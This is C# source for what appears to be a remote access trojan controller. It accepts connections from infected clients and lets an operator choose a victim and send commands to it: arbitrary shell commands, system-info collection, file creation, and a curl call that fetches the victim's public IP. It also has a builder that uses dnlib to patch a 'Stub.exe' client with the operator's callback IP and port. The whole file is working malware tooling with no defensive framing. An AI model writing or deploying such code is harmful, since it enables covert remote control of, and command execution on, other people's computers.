using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using dnlib.DotNet;
using dnlib.DotNet.Writer;
using dnlib.DotNet.Emit;

namespace ServerApp
{
    class Program
    {
        private static List<ClientInfo> clients = new List<ClientInfo>();
        private static int currentClientIndex = -1;

        static void Main(string[] args)
        {
            TcpListener listener = new TcpListener(IPAddress.Any, 8080);
            listener.Start();
            Console.WriteLine("Server is listening on port 8080...");

            Thread acceptThread = new Thread(() =>
            {
                while (true)
                {
                    TcpClient client = listener.AcceptTcpClient();
                    string clientEndPoint = client.Client.RemoteEndPoint.ToString();
                    NetworkStream stream = client.GetStream();
                    ClientInfo newClient = new ClientInfo
                    {
                        Client = client,
                        Stream = stream,
                        Id = Guid.NewGuid().ToString(),
                        IpAddress = clientEndPoint
                    };
                    clients.Add(newClient);
                    Console.WriteLine($"Client connected: {newClient.Id} at {newClient.IpAddress}");

                    Thread clientThread = new Thread(HandleClient);
                    clientThread.Start(newClient);
                }
            });
            acceptThread.Start();

            while (true)
            {
                if (Console.KeyAvailable)
                {
                    var key = Console.ReadKey(true).Key;
                    switch (key)
                    {
                        case ConsoleKey.UpArrow:
                        case ConsoleKey.DownArrow:
                            MoveSelection(key == ConsoleKey.UpArrow ? -1 : 1);
                            break;
                        case ConsoleKey.Enter:
                            if (currentClientIndex >= 0 && currentClientIndex < clients.Count)
                                DisplayCommandMenu();
                            else
                                Console.WriteLine("No client selected. Use arrow keys to select a client.");
                            break;
                        case ConsoleKey.B:
                            DisplayBuildMenu();
                            break;
                    }
                }
            }
        }
        static void DisplayBuildMenu()
        {
            Console.Clear();
            Console.WriteLine("Welcome to the Builder!");
            Console.Write("Please enter the IP Address: ");
            string ipAddress = Console.ReadLine();

            Console.Write("Please enter the Port: ");
            if (!int.TryParse(Console.ReadLine(), out int port))
            {
                Console.WriteLine("Invalid port. Exiting...");
                return;
            }

            ModifyStub("Stub.exe", ipAddress, port, "ModifiedStub.exe");
            Console.WriteLine("Stub has been successfully modified.");
        }

        static void ModifyStub(string inputPath, string newIP, int newPort, string outputPath)
        {
            ModuleDefMD module = ModuleDefMD.Load(inputPath);

            // Locate the specific type with the serverAddress and serverPort fields
            TypeDef programType = module.Find("ClientApp.Program", true);
            if (programType == null)
            {
                Console.WriteLine("ClientApp.Program type not found.");
                return;
            }

            // Modify the static constructor or the initializer method
            foreach (var method in programType.Methods)
            {
                if (method.IsStaticConstructor || method.IsConstructor)
                {
                    for (int i = 0; i < method.Body.Instructions.Count; i++)
                    {
                        // Modify the IP address
                        if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr &&
                            method.Body.Instructions[i].Operand.ToString() == "%ADDRESS%") // Check for the original IP address
                        {
                            method.Body.Instructions[i].Operand = newIP;
                        }
                        // Modify the port
                        else if (method.Body.Instructions[i].OpCode == OpCodes.Ldc_I4 &&
                                 (int)method.Body.Instructions[i].Operand == 02220) // Check for the original port
                        {
                            method.Body.Instructions[i].Operand = newPort;
                        }
                    }
                }
            }

            // Save the modified assembly
            module.Write(outputPath);
            Console.WriteLine("Client modified and saved to " + outputPath);
        }

        static void DisplayCommandMenu()
        {
            while (true)
            {
                Console.Clear();
                Console.WriteLine($"Commands for {clients[currentClientIndex].Id} at {clients[currentClientIndex].IpAddress}");
                Console.WriteLine("1: Open Notepad");
                Console.WriteLine("2: Get System Info");
                Console.WriteLine("3: Custom Shell Command");
                Console.WriteLine("4: Create File");
                Console.WriteLine("5: Show IP");
                Console.WriteLine("6: Exit Command Menu");
                Console.WriteLine("Enter the number of the command to execute or exit:");

                string choice = Console.ReadLine();
                string command = "";
                switch (choice)
                {
                    case "1":
                        command = "shell start notepad.exe";
                        SendCommandToClient(clients[currentClientIndex], command);
                        break;
                    case "2":
                        command = "getsysinfo";
                        SendCommandToClient(clients[currentClientIndex], command);
                        break;
                    case "3":
                        Console.WriteLine("Type the command to execute:");
                        command = $"shell {Console.ReadLine()}";
                        SendCommandToClient(clients[currentClientIndex], command);
                        break;
                    case "4":
                        Console.WriteLine("Enter the path for the new file:");
                        command = $"file create {Console.ReadLine()}";
                        SendCommandToClient(clients[currentClientIndex], command);
                        break;
                    case "5":
                        command = "shell curl api.ipify.org";
                        SendCommandToClient(clients[currentClientIndex], command);
                        break;
                    case "6":
                        return;// Exit the command menu
                    default:
                        Console.WriteLine("Invalid command selection. Please try again.");
                        continue;
                }

                Console.WriteLine("Press Enter to return to the command menu or any other key to continue...");
                if (Console.ReadKey(true).Key != ConsoleKey.Enter)
                    break;
            }
        }

        static void MoveSelection(int direction)
        {
            if (clients.Count == 0)
            {
                Console.WriteLine("No clients connected.");
                return;
            }

            currentClientIndex = (currentClientIndex + direction + clients.Count) % clients.Count;
            DisplayClients();
        }

        static void DisplayClients()
        {
            Console.Clear();
            for (int i = 0; i < clients.Count; i++)
            {
                if (i == currentClientIndex)
                {
                    Console.BackgroundColor = ConsoleColor.Blue;
                    Console.ForegroundColor = ConsoleColor.White;
                }
                Console.WriteLine($"Client {clients[i].Id} at {clients[i].IpAddress}");
                Console.ResetColor();
            }
        }

        static void HandleClient(object clientObject)
        {
            ClientInfo clientInfo = (ClientInfo)clientObject;
            try
            {
                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = clientInfo.Stream.Read(buffer, 0, buffer.Length)) != 0)
                {
                    string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    if (message == "ping")
                    {
                        SendCommandToClient(clientInfo, "pong");
                    }
                    else if (message != "ping")
                    {
                        Console.WriteLine($"Received from {clientInfo.Id} ({clientInfo.IpAddress}): {message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error with client {clientInfo.Id} ({clientInfo.IpAddress}): {ex.Message}");
            }
            finally
            {
                clientInfo.Stream.Close();
                clientInfo.Client.Close();
                clients.Remove(clientInfo);
                Console.WriteLine($"Client {clientInfo.Id} at {clientInfo.IpAddress} disconnected.");
            }
        }

        static void SendCommandToClient(ClientInfo client, string command)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(command);
            try
            {
                client.Stream.Write(buffer, 0, buffer.Length);
                if (command != "pong")
                {
                    Console.WriteLine($"Command sent to {client.Id} ({client.IpAddress}): {command}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to send command ({command}) to {client.Id} ({client.IpAddress}): {ex.Message}");
            }
        }
    }

    class ClientInfo
    {
        public TcpClient Client { get; set; }
        public NetworkStream Stream { get; set; }
        public string Id { get; set; }
        public string IpAddress { get; set; }
    }
}
